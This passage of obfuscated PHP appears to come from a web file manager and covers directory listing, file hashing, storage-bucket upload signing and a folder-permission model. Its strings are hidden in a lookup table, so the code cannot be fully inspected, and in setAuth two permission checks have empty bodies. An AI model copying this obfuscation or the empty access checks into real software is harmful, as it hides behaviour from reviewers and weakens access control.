$“‹ç‚×ñ = rtrim($“‹ç‚×ñ, $ÂÎëºŸ¢[8]) . $ÂÎëºŸ¢[8]; $ÃŠ“Õîğ = array($ÂÎëºŸ¢[85] => array(), $ÂÎëºŸ¢[86] => array()); if (!($Äâ³Õï¡ = @opendir($“‹ç‚×ñ))) { return $ÃŠ“Õîğ; } while (($Ôá‹Ùƒ¦ = readdir($Äâ³Õï¡)) !== !1) { if ($Ôá‹Ùƒ¦ == $ÂÎëºŸ¢[10] || $Ôá‹Ùƒ¦ == $ÂÎëºŸ¢[1373]) { continue; } $¤ÅÏÔ‚Ü = $“‹ç‚×ñ . $Ôá‹Ùƒ¦; if (is_file($¤ÅÏÔ‚Ü)) { $ÃŠ“Õîğ[$ÂÎëºŸ¢[86]][] = $this->fileInfo($¤ÅÏÔ‚Ü, $·ãñ‚ÓÇ); } else { $ÃŠ“Õîğ[$ÂÎëºŸ¢[85]][] = $this->folderInfo($¤ÅÏÔ‚Ü, $·ãñ‚ÓÇ); } } closedir($Äâ³Õï¡); return $ÃŠ“Õîğ; } public function listAll($–‚­æÈø, &$ïÂ¢’”• = array()) { $ŸÜÚ‰İ‹ =& $_SERVER[§Êá¸İ]; $–‚­æÈø = $this->iconvSystem($–‚­æÈø); $–‚­æÈø = rtrim($–‚­æÈø, $ŸÜÚ‰İ‹[8]) . $ŸÜÚ‰İ‹[8]; if (!($×şû…Ğï = @opendir($–‚­æÈø))) { return $ïÂ¢’”•; } while (($ğÉ‰ƒõÀ = readdir($×şû…Ğï)) !== !1) { if ($ğÉ‰ƒõÀ == $ŸÜÚ‰İ‹[10] || $ğÉ‰ƒõÀ == $ŸÜÚ‰İ‹[1373]) { continue; } $ÖÎ´Ò = $–‚­æÈø . $ğÉ‰ƒõÀ; $ãØüòò× = is_dir($ÖÎ´Ò) && !is_link($ÖÎ´Ò) ? 1 : 0; $ÖÎ´Ò = $ãØüòò× ? $ÖÎ´Ò . $ŸÜÚ‰İ‹[8] : $ÖÎ´Ò; $ïÂ¢’”•[] = array($ŸÜÚ‰İ‹[87] => $ÖÎ´Ò, $ŸÜÚ‰İ‹[78] => $ãØüòò×, $ŸÜÚ‰İ‹[88] => intval(@filemtime($ÖÎ´Ò)), $ŸÜÚ‰İ‹[79] => $ãØüòò× ? 0 : intval($this->size($ÖÎ´Ò))); if ($ãØüòò×) { $this->listAll($ÖÎ´Ò, $ïÂ¢’”•); } } closedir($×şû…Ğï); return $ïÂ¢’”•; } public function has($°Õ¶¤÷Î, $ÃÍ¤Ñû = false, $Ûğë‘„ = true) { $‹ù•Òû =& $_SERVER[§Êá¸İ]; $°Õ¶¤÷Î = $this->iconvSystem($°Õ¶¤÷Î); $°Õ¶¤÷Î = rtrim($°Õ¶¤÷Î, $‹ù•Òû[8]) . $‹ù•Òû[8]; if (!($ß¼äù™– = @opendir($°Õ¶¤÷Î))) { return !1; } $àúèƒÂÚ = 0; $æÂîİ‹Ö = 0; $¾±ˆòÀ· = 0; while (($É‘ßıˆ˜ = readdir($ß¼äù™–)) !== !1) { if ($É‘ßıˆ˜ == $‹ù•Òû[10] || $É‘ßıˆ˜ == $‹ù•Òû[1373]) { continue; } $Î˜Ÿ²Ò = $°Õ¶¤÷Î . $É‘ßıˆ˜; if ($ÃÍ¤Ñû) { $¾±ˆòÀ·++; if (@is_file($Î˜Ÿ²Ò)) { $àúèƒÂÚ++; } else { $æÂîİ‹Ö++; } if ($¾±ˆòÀ· > 10000) { break; } continue; } if ($Ûğë‘„) { if (@is_file($Î˜Ÿ²Ò)) { return !0; } } else { if (@is_dir($Î˜Ÿ²Ò . $‹ù•Òû[8])) { return !0; } } } closedir($ß¼äù™–); if ($ÃÍ¤Ñû) { return array($‹ù•Òû[239] => $àúèƒÂÚ, $‹ù•Òû[240] => $æÂîİ‹Ö); } return !1; } public function hashSimple($¨ş¿À¯ğ) { $ò­¨˜ˆ =& $_SERVER[§Êá¸İ]; if (!$¨ş¿À¯ğ) { return md5($ò­¨˜ˆ[12]); } $¨ş¿À¯ğ = $this->iconvSystem($¨ş¿À¯ğ); $Å³ÕËÕ = $this->size($¨ş¿À¯ğ); $Ìã°äë = 200; $²¦€§ì– = 50; if ($Å³ÕËÕ <= $Ìã°äë * $²¦€§ì–) { return $this->hashMd5($¨ş¿À¯ğ) . $Å³ÕËÕ; } $êİ¬”ì« = $ò­¨˜ˆ[12]; $ªÖ÷§¡î = intval($Å³ÕËÕ / $²¦€§ì–); $ñÆı¨¤Ğ = fopen($¨ş¿À¯ğ, $ò­¨˜ˆ[1466]); if (!$ñÆı¨¤Ğ) { return $êİ¬”ì«; } for ($¢ª•Ú€ò = 0; $¢ª•Ú€ò < $²¦€§ì–; $¢ª•Ú€ò++) { fseek_64($ñÆı¨¤Ğ, $ªÖ÷§¡î * $¢ª•Ú€ò); $êİ¬”ì« .= fread($ñÆı¨¤Ğ, $Ìã°äë); } fseek_64($ñÆı¨¤Ğ, $Å³ÕËÕ - $Ìã°äë); $êİ¬”ì« .= fread($ñÆı¨¤Ğ, $Ìã°äë); fclose($ñÆı¨¤Ğ); return md5($êİ¬”ì«) . $Å³ÕËÕ; } public function getContent($À„¸ğ‰Ì) { $À„¸ğ‰Ì = $this->iconvSystem($À„¸ğ‰Ì); return file_get_contents($À„¸ğ‰Ì); } public function setContent($ºª¤­Í«, $œŠõ = '') { $ºª¤­Í« = $this->iconvSystem($ºª¤­Í«); $ú»Ü²Ùğ = @file_put_contents($ºª¤­Í«, $œŠõ, LOCK_EX); if (!$ú»Ü²Ùğ) { $this->writeLog(__FUNCTION__ . $_SERVER[§Êá¸İ][1458], !0); } clearstatcache(); @chmod($ºª¤­Í«, $this->pathAuth); return $ú»Ü²Ùğ === !1 ? !1 : !0; } public function fileSubstr($˜ù›àòø, $ŠğÂ«Ò½ = 0, $§œû¦ï = false) { $§ú­±« =& $_SERVER[§Êá¸İ]; $˜ù›àòø = $this->iconvSystem($˜ù›àòø); if ($§œû¦ï === !1) { $§œû¦ï = $this->size($˜ù›àòø); } if ($§œû¦ï <= 0) { return $§ú­±«[12]; } $ÀæµÕãá = fopen($˜ù›àòø, $§ú­±«[1466]); if (!$ÀæµÕãá) { return !1; } fseek_64($ÀæµÕãá, $ŠğÂ«Ò½); $š†´¿ å = fread($ÀæµÕãá, $§œû¦ï); fclose($ÀæµÕãá); if (!$š†´¿ å) { $this->writeLog(__FUNCTION__ . $§ú­±«[1458], !0); } return $š†´¿ å; } public function upload($’éñı, $öŸ”ŸÍ¹, $Üşö’ë = false, $óŸ«ùçØ = REPEAT_REPLACE) { if ($Üşö’ë) { return $this->moveFile($öŸ”ŸÍ¹, $’éñı); } return $this->copyFile($öŸ”ŸÍ¹, $’éñı); } public function setModifyTime($›á¨ùÔé, $Ò“ì¤ü = '') { @touch($›á¨ùÔé, intval($Ò“ì¤ü)); } public function download($ì·×¬¯², $èŠ±Õ¤Ê) { return $this->iconvSystem($ì·×¬¯²); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($èº˜ËÛ¯) { parent::__construct($èº˜ËÛ¯); $this->setSignVersion($_SERVER[§Êá¸İ][247]); } public function fileOutImage($¼¬áä­Í, $ìÕ¥÷ÌÉ = 250) { $ÎÓı­ğ =& $_SERVER[§Êá¸İ]; if ($this->size($¼¬áä­Í) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¼¬áä­Í, $ìÕ¥÷ÌÉ); } $›ƒ·Ï¸ = array($ÎÓı­ğ[1467] => $ÎÓı­ğ[1468] . $ìÕ¥÷ÌÉ . $ÎÓı­ğ[1469]); $ ñ…ğ– = $this->link($¼¬áä­Í, $›ƒ·Ï¸); $this->fileOutLink($ ñ…ğ–); } public function fileOutLink($ŞÕåıÚ×) { $§öéáÂÔ =& $_SERVER[§Êá¸İ]; if (substr($ŞÕåıÚ×, 0, 7) == $§öéáÂÔ[313]) { $ŞÕåıÚ× = $§öéáÂÔ[314] . substr($ŞÕåıÚ×, 7); } header($§öéáÂÔ[175] . $ŞÕåıÚ×); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ñÒÒ „) { parent::__construct($ñÒÒ „); $this->setSignVersion($_SERVER[§Êá¸İ][247]); } public function fileOutLink($ÜĞŠ€ªŸ) { $·œ’•¸‹ =& $_SERVER[§Êá¸İ]; if (substr($ÜĞŠ€ªŸ, 0, 7) == $·œ’•¸‹[313]) { $ÜĞŠ€ªŸ = $·œ’•¸‹[314] . substr($ÜĞŠ€ªŸ, 7); } header($·œ’•¸‹[175] . $ÜĞŠ€ªŸ); die; } } goto c…ñö£±ã³; Fóáµ†ªÉ†: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($áĞ´§¯©) { parent::__construct($áĞ´§¯©); } public function uploadFormData($¶ì«†ªò, $î«Ï‚ú„ = 3600) { $óã®±»æ =& $_SERVER[§Êá¸İ]; $ƒ¤Åß¬ = $óã®±»æ[229]; $ö¸Ô¨½Ù = $óã®±»æ[270]; $ô²µ¾ŒĞ = $óã®±»æ[62]; $öéÊà° = gmdate($óã®±»æ[271]); $Í‡†ªº× = gmdate($óã®±»æ[272]); $š§‡•Ô” = $óã®±»æ[273]; $ÍÁ˜‡¬İ = $î«Ï‚ú„ . $óã®±»æ[12]; $¼ĞºŠ›ö = $óã®±»æ[274]; $‡½…²÷õ = array($this->accessKey, $Í‡†ªº×, $this->region, $ô²µ¾ŒĞ, $š§‡•Ô”); $ãö‚ïŠœ = implode($óã®±»æ[8], $‡½…²÷õ); $íåŠÉ´ = array($óã®±»æ[275] => gmdate($óã®±»æ[299], strtotime($óã®±»æ[277])), $óã®±»æ[278] => array(array($óã®±»æ[279] => $this->bucket), array($óã®±»æ[280] => $ƒ¤Åß¬), array($óã®±»æ[281], $óã®±»æ[282], $óã®±»æ[12]), array($óã®±»æ[281], $óã®±»æ[283], $óã®±»æ[12]), array($óã®±»æ[281], $óã®±»æ[284], $óã®±»æ[12]), array($óã®±»æ[285] => $¼ĞºŠ›ö), array($óã®±»æ[286] => $ãö‚ïŠœ), array($óã®±»æ[287] => $ö¸Ô¨½Ù), array($óã®±»æ[288] => $öéÊà°), array($óã®±»æ[289] => $ÍÁ˜‡¬İ))); $£àÎ¯ = base64_encode(json_encode($íåŠÉ´)); $¯È­œÑ‰ = hash_hmac($óã®±»æ[290], $Í‡†ªº×, $óã®±»æ[291] . $this->secret, !0); $±÷ìÒÙÓ = hash_hmac($óã®±»æ[290], $this->region, $¯È­œÑ‰, !0); $ˆÔ¶¼ğ¸ = hash_hmac($óã®±»æ[290], $ô²µ¾ŒĞ, $±÷ìÒÙÓ, !0); $Ş€¹™èĞ = hash_hmac($óã®±»æ[290], $š§‡•Ô”, $ˆÔ¶¼ğ¸, !0); $ƒèÏê²ù = hash_hmac($óã®±»æ[290], $£àÎ¯, $Ş€¹™èĞ); $’×Íøµ = array($óã®±»æ[246] => $óã®±»æ[12], $óã®±»æ[292] => $óã®±»æ[12], $óã®±»æ[280] => $ƒ¤Åß¬, $óã®±»æ[285] => $¼ĞºŠ›ö, $óã®±»æ[293] => $£àÎ¯, $óã®±»æ[294] => $ãö‚ïŠœ, $óã®±»æ[295] => $ö¸Ô¨½Ù, $óã®±»æ[296] => $öéÊà°, $óã®±»æ[297] => $ÍÁ˜‡¬İ, $óã®±»æ[298] => $ƒèÏê²ù, $óã®±»æ[208] => $this->getHost()); return $’×Íøµ; } public function multiUploadFormData($øÆ²€¤Œ, $±ˆ®Óî = 3600) { $²œ¤ÒòÙ =& $_SERVER[§Êá¸İ]; $êÆ„öŸ´ = gmdate($²œ¤ÒòÙ[300]); $ßÛ¨‰º³ = array(); $í‹¯Äµô = $this->client->getUploadId($this->bucket, $øÆ²€¤Œ, $ßÛ¨‰º³); if (!$í‹¯Äµô) { return !1; } return array($²œ¤ÒòÙ[254] => $í‹¯Äµô, $²œ¤ÒòÙ[208] => $this->getHost() . $²œ¤ÒòÙ[8] . $this->pathEncode($øÆ²€¤Œ), $²œ¤ÒòÙ[255] => $êÆ„öŸ´, $²œ¤ÒòÙ[97] => $øÆ²€¤Œ); } public function multiUploadAuthData($‚«¤Ö»‘, $“Ê°İ = array()) { $Ì…´ôˆ¢ =& $_SERVER[§Êá¸İ]; $ÛîàÅü = isset($“Ê°İ[$Ì…´ôˆ¢[169]]) ? $“Ê°İ[$Ì…´ôˆ¢[169]] : $Ì…´ôˆ¢[12]; $ºİ¥ŒÚÕ = $“Ê°İ[$Ì…´ôˆ¢[97]]; unset($“Ê°İ[$Ì…´ôˆ¢[97]]); if (isset($“Ê°İ[$Ì…´ôˆ¢[256]])) { return $this->listUploadParts($ºİ¥ŒÚÕ, $“Ê°İ); } $ÕÕ˜šÅÑ = array(); if (isset($“Ê°İ[$Ì…´ôˆ¢[301]])) { $ÕÕ˜šÅÑ[$Ì…´ôˆ¢[302]] = $“Ê°İ[$Ì…´ôˆ¢[301]]; } $æİÁø²Ê = explode($Ì…´ôˆ¢[210], $this->getHost()); $¢¡ş‡¬ë = array($Ì…´ôˆ¢[303] => $æİÁø²Ê[1], $Ì…´ôˆ¢[304] => $Ì…´ôˆ¢[12], $Ì…´ôˆ¢[246] => $Ì…´ôˆ¢[123], $Ì…´ôˆ¢[292] => $“Ê°İ[$Ì…´ôˆ¢[79]]); $Œ¾ˆçÛÎ = $Ì…´ôˆ¢[259]; $‚ìºş¸ = $Ì…´ôˆ¢[8] . $this->pathEncode($ºİ¥ŒÚÕ) . $ÛîàÅü; $ı¢‚Ëü = $this->client->__getSignatureV4($ÕÕ˜šÅÑ, $¢¡ş‡¬ë, $Œ¾ˆçÛÎ, $‚ìºş¸); if (strpos($ÛîàÅü, $Ì…´ôˆ¢[258]) === 0) { if (isset($ÕÕ˜šÅÑ[$Ì…´ôˆ¢[302]])) { $—˜—¹Õ = $ÕÕ˜šÅÑ[$Ì…´ôˆ¢[302]]; } else { if (isset($ı¢‚Ëü[$Ì…´ôˆ¢[302]])) { $—˜—¹Õ = $ı¢‚Ëü[$Ì…´ôˆ¢[302]]; } else { $—˜—¹Õ = hash($Ì…´ôˆ¢[290], $Ì…´ôˆ¢[12]); } } return array($Ì…´ôˆ¢[265] => $ı¢‚Ëü[$Ì…´ôˆ¢[265]], $Ì…´ôˆ¢[302] => $—˜—¹Õ, $Ì…´ôˆ¢[255] => $ı¢‚Ëü[$Ì…´ôˆ¢[305]]); } return $ı¢‚Ëü[$Ì…´ôˆ¢[265]]; } public function listUploadParts($€óœÉù, $¤—¸íØÖ = array()) { $…€£»îÉ =& $_SERVER[§Êá¸İ]; $åó¬¶¿ = str_replace($…€£»îÉ[266], $…€£»îÉ[12], $¤—¸íØÖ[$…€£»îÉ[169]]); $çç“¶Â = $this->client->listParts($this->bucket, $€óœÉù, $åó¬¶¿); if (!$çç“¶Â) { return !1; } $·Á´É³ = $…€£»îÉ[306]; foreach ($çç“¶Â as $¶áÄàÁˆ) { $·Á´É³ .= $…€£»îÉ[307] . "\x3c\x50\141\x72\x74\116\165\155\142\x65\162\76{$¶áÄàÁˆ[$…€£»îÉ[308]]}\x3c\x2f\120\x61\x72\164\116\x75\155\142\145\x72\76\12" . "\x3c\105\x54\x61\147\76{$¶áÄàÁˆ[$…€£»îÉ[309]]}\74\57\x45\124\x61\x67\76\12" . $…€£»îÉ[310]; } $·Á´É³ .= $…€£»îÉ[311]; $üË´€×¦ = array(); $Şƒœçƒİ = explode($…€£»îÉ[210], $this->getHost()); $§Ö„Ğ–Û = array($…€£»îÉ[303] => $Şƒœçƒİ[1], $…€£»îÉ[246] => $…€£»îÉ[123], $…€£»îÉ[292] => strlen($·Á´É³)); $«¶Ï†” = $…€£»îÉ[257]; $¡¼±†‰š = $…€£»îÉ[8] . $this->pathEncode($€óœÉù) . $¤—¸íØÖ[$…€£»îÉ[169]]; $É¿¬å²° = $this->client->__getSignatureV4($üË´€×¦, $§Ö„Ğ–Û, $«¶Ï†”, $¡¼±†‰š, $·Á´É³); return array($…€£»îÉ[265] => $É¿¬å²°[$…€£»îÉ[265]], $…€£»îÉ[255] => $É¿¬å²°[$…€£»îÉ[305]], $…€£»îÉ[267] => $çç“¶Â, $…€£»îÉ[302] => $É¿¬å²°[$…€£»îÉ[302]]); } public function link($ö¿ŸáÜ´, $»ğÙä‘ = array()) { return parent::link($ö¿ŸáÜ´, $»ğÙä‘); } public function fileOut($Šò‚ìàÍ, $¸Ã•›‡• = false, $Ö‹¦ö€ï = false, $œáï¢“ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[§Êá¸İ][312])) { return parent::fileOutServer($Šò‚ìàÍ, $¸Ã•›‡•, $Ö‹¦ö€ï, $œáï¢“); } parent::fileOut($Šò‚ìàÍ, $¸Ã•›‡•, $Ö‹¦ö€ï, $œáï¢“); } public function fileOutImage($êìØ¼íÜ, $ı‡±¶Õ¢ = 250) { if (strstr($this->endpoint, $_SERVER[§Êá¸İ][312])) { return parent::fileOutImageServer($êìØ¼íÜ, $ı‡±¶Õ¢); } parent::fileOutImage($êìØ¼íÜ, $ı‡±¶Õ¢); } public function fileOutLink($á¦‘¨ò) { $¯øÍ§ƒ© =& $_SERVER[§Êá¸İ]; if (substr($á¦‘¨ò, 0, 7) == $¯øÍ§ƒ©[313]) { $á¦‘¨ò = $¯øÍ§ƒ©[314] . substr($á¦‘¨ò, 7); } header($¯øÍ§ƒ©[175] . $á¦‘¨ò); die; } } define($_SERVER[§Êá¸İ][315], 1); define($_SERVER[§Êá¸İ][316], 2); goto fÕÓö¶Ä; dÄ«¹„åç²: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\143\x65\x5f\141\165\164\x68"; public function getAuth($¥¢·øÕæ) { $Ø¶Ÿ­ =& $_SERVER[§Êá¸İ]; $Üµª¸Ò = $this->sourceAuthSelect($¥¢·øÕæ); $ìŒİâĞñ = array(); $Ÿ¬…óß¥ = array(); $ê ØÇ†ã = 2 << 25; foreach ($Üµª¸Ò as $Ò€ŞÅÕ´) { $áï˜òü¶ = Model($Ø¶Ÿ­[579])->listData($Ò€ŞÅÕ´[$Ø¶Ÿ­[2086]]); if (!$áï˜òü¶) { continue; } $ìŒİâĞñ[] = $Ò€ŞÅÕ´; $Ú£ş®êŸ = 0; if ($Ò€ŞÅÕ´[$Ø¶Ÿ­[190]] == SourceModel::TYPE_GROUP) { $Ú£ş®êŸ = $ê ØÇ†ã * 2; } if ($Ò€ŞÅÕ´[$Ø¶Ÿ­[190]] == SourceModel::TYPE_USER) { $Ú£ş®êŸ = $ê ØÇ†ã; } if ($Ò€ŞÅÕ´[$Ø¶Ÿ­[190]] == SourceModel::TYPE_USER && $Ò€ŞÅÕ´[$Ø¶Ÿ­[577]] == $Ø¶Ÿ­[228]) { $Ú£ş®êŸ = 0; } $Ÿ¬…óß¥[] = $áï˜òü¶[$Ø¶Ÿ­[495]] + $Ú£ş®êŸ; } array_multisort($Ÿ¬…óß¥, SORT_DESC, $ìŒİâĞñ); return $ìŒİâĞñ; } public function sourceAuthSelect($ŞÙ¿ã‰‡) { $©Â¼ò×· =& $_SERVER[§Êá¸İ]; static $‚çû½£Š = array(); $§ÂÛ’»ø = is_array($ŞÙ¿ã‰‡) ? !1 : !0; if ($§ÂÛ’»ø) { $ŞÙ¿ã‰‡ = array($ŞÙ¿ã‰‡); } $Á½ÈÇ—¼ = array(); foreach ($ŞÙ¿ã‰‡ as $µëşÌ¦â) { if (isset($‚çû½£Š[$µëşÌ¦â])) { $Á½ÈÇ—¼[$µëşÌ¦â] = $‚çû½£Š[$µëşÌ¦â]; } } if (count($Á½ÈÇ—¼) == count($ŞÙ¿ã‰‡)) { return $§ÂÛ’»ø ? $Á½ÈÇ—¼[$ŞÙ¿ã‰‡[0]] : $Á½ÈÇ—¼; } $ÄÁÒ¾œÕ = $©Â¼ò×·[2163]; $áèÊÇ = array($©Â¼ò×·[193] => array($©Â¼ò×·[7], $ŞÙ¿ã‰‡)); $²º¡³Ã¸ = $this->field($ÄÁÒ¾œÕ)->order($©Â¼ò×·[483])->where($áèÊÇ)->select(); $“ì›¥„Œ = array_to_keyvalue_group($²º¡³Ã¸, $©Â¼ò×·[193]); foreach ($ŞÙ¿ã‰‡ as $µëşÌ¦â) { $‚çû½£Š[$µëşÌ¦â] = $“ì›¥„Œ[$µëşÌ¦â] ? $“ì›¥„Œ[$µëşÌ¦â] : array(); } if ($§ÂÛ’»ø) { return $²º¡³Ã¸; } return $“ì›¥„Œ; } public function setAuth($ËÎ•·ÙÙ, $„êÃ‘„ô) { $¾Ü›Ö¯ó =& $_SERVER[§Êá¸İ]; $ßÕí®Ú´ = Model($¾Ü›Ö¯ó[1428])->sourceInfo($ËÎ•·ÙÙ); if (!$ßÕí®Ú´) { return !1; } if ($ßÕí®Ú´[$¾Ü›Ö¯ó[190]] != SourceModel::TYPE_GROUP) { return !1; } $ÍµâÓ¯ç = 1; $©£øóÒÓ = $ßÕí®Ú´[$¾Ü›Ö¯ó[577]]; if ($©£øóÒÓ != $ÍµâÓ¯ç) { $¸ƒ’­Ÿø = array($¾Ü›Ö¯ó[1978] => $©£øóÒÓ); $¡§º¨î = Model($¾Ü›Ö¯ó[2072])->field($¾Ü›Ö¯ó[1779])->where($¸ƒ’­Ÿø)->select(); $¡§º¨î = array_to_keyvalue($¡§º¨î, $¾Ü›Ö¯ó[12], $¾Ü›Ö¯ó[1779]); } $õŒ˜òç = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ŞîÄÇ“ = array(); foreach ($„êÃ‘„ô as $İÁóä’ğ) { if (!in_array($İÁóä’ğ[$¾Ü›Ö¯ó[190]], $õŒ˜òç)) { show_json(LNG($¾Ü›Ö¯ó[2164]), !1); } if ($©£øóÒÓ != $ÍµâÓ¯ç) { if ($İÁóä’ğ[$¾Ü›Ö¯ó[190]] == SourceModel::TYPE_GROUP) { } if ($İÁóä’ğ[$¾Ü›Ö¯ó[577]] != 0 && !in_array($İÁóä’ğ[$¾Ü›Ö¯ó[577]], $¡§º¨î)) { } } if ($İÁóä’ğ[$¾Ü›Ö¯ó[577]] == 0) { $İÁóä’ğ[$¾Ü›Ö¯ó[190]] = SourceModel::TYPE_USER; } $ŞîÄÇ“[] = array($¾Ü›Ö¯ó[193] => $ËÎ•·ÙÙ, $¾Ü›Ö¯ó[190] => intval($İÁóä’ğ[$¾Ü›Ö¯ó[190]]), $¾Ü›Ö¯ó[577] => intval($İÁóä’ğ[$¾Ü›Ö¯ó[577]]), $¾Ü›Ö¯ó[2086] => intval($İÁóä’ğ[$¾Ü›Ö¯ó[2086]]) ? intval($İÁóä’ğ[$¾Ü›Ö¯ó[2086]]) : 0, $¾Ü›Ö¯ó[2146] => intval($İÁóä’ğ[$¾Ü›Ö¯ó[2146]]) ? intval($İÁóä’ğ[$¾Ü›Ö¯ó[2146]]) : -1); } $this->where(array($¾Ü›Ö¯ó[499] => $ËÎ•·ÙÙ))->delete(); $this->addAll($ŞîÄÇ“); return !0; } public function authClear($¹»÷¿Ñ) { $¡¾ˆ‹ÄÑ =& $_SERVER[§Êá¸İ]; $®ĞÚâ‚ = Model($¡¾ˆ‹ÄÑ[1428])->sourceInfo($¹»÷¿Ñ); $ÖØœÃÌú = array($¹»÷¿Ñ); if ($®ĞÚâ‚[$¡¾ˆ‹ÄÑ[493]] == $¡¾ˆ‹ÄÑ[91]) { $·¹²É¾¹ = array($¡¾ˆ‹ÄÑ[660] => array($¡¾ˆ‹ÄÑ[620], $®ĞÚâ‚[$¡¾ˆ‹ÄÑ[592]] . $¹»÷¿Ñ . $¡¾ˆ‹ÄÑ[621])); $ÖØœÃÌú = Model($¡¾ˆ‹ÄÑ[1428])->field($¡¾ˆ‹ÄÑ[499])->where($·¹²É¾¹)->getField($¡¾ˆ‹ÄÑ[193], !0); $ÖØœÃÌú[] = $¹»÷¿Ñ; } $this->where(array($¡¾ˆ‹ÄÑ[499] => array($¡¾ˆ‹ÄÑ[500], $ÖØœÃÌú)))->delete(); return !0; } public function getAllChildren($°¾„æÍê) { $°£«ŠÏ– =& $_SERVER[§Êá¸İ]; $í®‚Â’û = Model($°£«ŠÏ–[1428])->sourceInfo($°¾„æÍê); if ($í®‚Â’û[$°£«ŠÏ–[493]] != $°£«ŠÏ–[91]) { return $this->sourceListAuth(array($°¾„æÍê)); } if ($í®‚Â’û[$°£«ŠÏ–[190]] != SourceModel::TYPE_GROUP) { return array(); } $†àá¼ôÂ = 1; $Î”€Š·÷ = array($°¾„æÍê); if ($í®‚Â’û[$°£«ŠÏ–[192]] == $°£«ŠÏ–[228] && $í®‚Â’û[$°£«ŠÏ–[577]] != $†àá¼ôÂ) { $Î”€Š·÷ = $this->groupChidldAllRootSource($í®‚Â’û[$°£«ŠÏ–[577]]); } $ùšÁòáí = $this->field($°£«ŠÏ–[193])->group($°£«ŠÏ–[193])->select(); $ùšÁòáí = array_to_keyvalue($ùšÁòáí, $°£«ŠÏ–[12], $°£«ŠÏ–[193]); if (!$ùšÁòáí) { return array(); } $ÏØ—ŠÏ× = $°£«ŠÏ–[2165]; $®ÏáÆ²ã = array($°£«ŠÏ–[193] => array($°£«ŠÏ–[7], $ùšÁòáí), $°£«ŠÏ–[513] => $°£«ŠÏ–[228]); $™Øë±™ƒ = Model($°£«ŠÏ–[911])->field($ÏØ—ŠÏ×)->where($®ÏáÆ²ã)->select(); $°äÙæ­ª = array($°¾„æÍê); foreach ($™Øë±™ƒ as $ÓŸäœú«) { foreach ($Î”€Š·÷ as $Üò÷ÙåÅ) { $±öòõ¢¨ = $°£«ŠÏ–[50] . $Üò÷ÙåÅ . $°£«ŠÏ–[50]; $ÕğÅƒ°° = $ÓŸäœú«[$°£«ŠÏ–[592]] . $ÓŸäœú«[$°£«ŠÏ–[193]] . $°£«ŠÏ–[50]; if (strstr($ÕğÅƒ°°, $±öòõ¢¨)) { $°äÙæ­ª[] = $ÓŸäœú«[$°£«ŠÏ–[193]]; break; } } } return $this->sourceListAuth($°äÙæ­ª); } private function sourceListAuth($ÕíåŠó) { $åß³‚óı =& $_SERVER[§Êá¸İ]; $‹Ê÷„«â = Model($åß³‚óı[1428])->sourceListInfo($ÕíåŠó, !0); $ØÊİêØ = $this->sourceAuthSelect($ÕíåŠó); $ÓªÇÑå¤ = array(); $Ë­ãƒ¡ü = array(); foreach ($‹Ê÷„«â as $°‚âœåÒ) { unset($°‚âœåÒ[$åß³‚óı[537]]); unset($°‚âœåÒ[$åß³‚óı[535]]); unset($°‚âœåÒ[$åß³‚óı[495]]); unset($°‚âœåÒ[$åß³‚óı[90]]); $·¿©§£ = $ØÊİêØ[$°‚âœåÒ[$åß³‚óı[193]]]; if (!$·¿©§£) { continue; } $°‚âœåÒ[$åß³‚óı[2166]] = $this->authTargetInfo($·¿©§£); $°‚âœåÒ[$åß³‚óı[590]] = rtrim($°‚âœåÒ[$åß³‚óı[596]], $åß³‚óı[8]) . $åß³‚óı[8] . ltrim($°‚âœåÒ[$åß³‚óı[590]], $åß³‚óı[8]); $ÓªÇÑå¤[] = $°‚âœåÒ; $ıˆÚ­Ä– = count(explode($åß³‚óı[8], trim($°‚âœåÒ[$åß³‚óı[590]], $åß³‚óı[8]))); $Ë­ãƒ¡ü[] = $ıˆÚ­Ä– + ($°‚âœåÒ[$åß³‚óı[33]] == $åß³‚óı[78] ? 0 : 1000); } array_multisort($Ë­ãƒ¡ü, SORT_ASC, $ÓªÇÑå¤); return $ÓªÇÑå¤; } private function groupChidldAllRootSource($Ğ¤ê­¸í) { $µ»œƒü¹ =& $_SERVER[§Êá¸İ]; $˜à®º÷ = Model($µ»œƒü¹[2167])->groupChildrenAll($Ğ¤ê­¸í); $ï·²•°á = array($µ»œƒü¹[192] => 0, $µ»œƒü¹[577] => array($µ»œƒü¹[7], $˜à®º÷), $µ»œƒü¹[190] => SourceModel::TYPE_GROUP); $¬Ÿê¬îÀ = Model($µ»œƒü¹[911])->field($µ»œƒü¹[193])->where($ï·²•°á)->select(); $¬Ÿê¬îÀ = array_to_keyvalue($¬Ÿê¬îÀ, $µ»œƒü¹[12], $µ»œƒü¹[193]); return $¬Ÿê¬îÀ; } private function authTargetInfo($ûÒÑ¶ÛÅ) { $é‚Ï„åĞ =& $_SERVER[§Êá¸İ]; $ÊÃåÛ›÷ = array(); $Ò®¦¢™ù = array(); $ˆ³ÄÅ£¤ = 2 << 25; foreach ($ûÒÑ¶ÛÅ as $ÖŞäÍ¯) { $ïò¢‰ÈÙ = Model($é‚Ï„åĞ[579])->listData($ÖŞäÍ¯[$é‚Ï„åĞ[2086]]); if (!$ïò¢‰ÈÙ) { continue; } if ($ÖŞäÍ¯[$é‚Ï„åĞ[190]] == SourceModel::TYPE_USER) { $ò½ñç²¡ = Model($é‚Ï„åĞ[585])->getInfoSimpleOuter($ÖŞäÍ¯[$é‚Ï„åĞ[577]]); if ($ò½ñç²¡[$é‚Ï„åĞ[1779]] == $é‚Ï„åĞ[1283]) { continue; } if ($ò½ñç²¡[$é‚Ï„åĞ[1779]] == $é‚Ï„åĞ[228]) { $ò½ñç²¡[$é‚Ï„åĞ[32]] = LNG($é‚Ï„åĞ[2168]); } } else { $ò½ñç²¡ = Model($é‚Ï„åĞ[593])->getInfoSimple($ÖŞäÍ¯[$é‚Ï„åĞ[577]]); } if (!$ò½ñç²¡) { continue; } $ò½ñç²¡[$é‚Ï„åĞ[548]] = $ïò¢‰ÈÙ; $ÊÃåÛ›÷[] = $ò½ñç²¡; $ĞŒÜëÂº = 0; if ($ÖŞäÍ¯[$é‚Ï„åĞ[190]] == SourceModel::TYPE_GROUP) { $ĞŒÜëÂº = $ˆ³ÄÅ£¤ * 2; } if ($ÖŞäÍ¯[$é‚Ï„åĞ[190]] == 